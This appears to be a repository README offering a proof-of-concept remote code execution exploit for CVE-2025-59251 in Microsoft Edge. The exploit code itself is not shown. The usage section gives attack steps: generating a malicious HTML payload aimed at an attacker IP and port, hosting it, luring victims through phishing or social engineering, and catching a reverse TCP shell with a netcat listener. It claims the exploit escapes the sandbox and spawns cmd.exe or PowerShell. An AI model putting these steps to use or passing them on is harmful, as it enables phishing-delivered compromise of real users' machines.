# CVE-2025-59251 Exploit: Microsoft Edge Chromium RCE

## Overview
This repository contains a proof-of-concept exploit for CVE-2025-59251, a critical remote code execution vulnerability in Microsoft Edge (Chromium-based) versions up to 140.0.3485.71. The vulnerability allows for code injection via remote manipulation, impacting confidentiality, integrity, and availability. Successful exploitation requires user interaction, such as visiting a malicious webpage, but can be launched remotely without authentication.

This exploit has been tested on Windows 10/11 environments with default Edge installations. It leverages a flaw in the handling of externally-influenced input during code segment construction (CWE-94), allowing arbitrary code execution in the browser's sandboxed process.


## Usage
1. **Generate Payload**:
   - Run `node generate-payload.js --target-ip <attacker-ip> --port <listener-port> --output exploit.html`
   - This creates a malicious HTML file with embedded JS that exploits the code injection vector.

2. **Delivery**:
   - Host the `exploit.html` on a web server (e.g., via Python: `python -m http.server 8080`).
   - Lure the victim to visit the URL (e.g., via phishing email or social engineering).
   - Listen for incoming connections using netcat: `nc -lvnp <port>`

3. **Execution**:
   - Upon victim interaction, the exploit injects shellcode, escapes the sandbox, and executes arbitrary commands (e.g., spawning cmd.exe or PowerShell).
   - Example shellcode included for demonstration: reverse TCP connection.
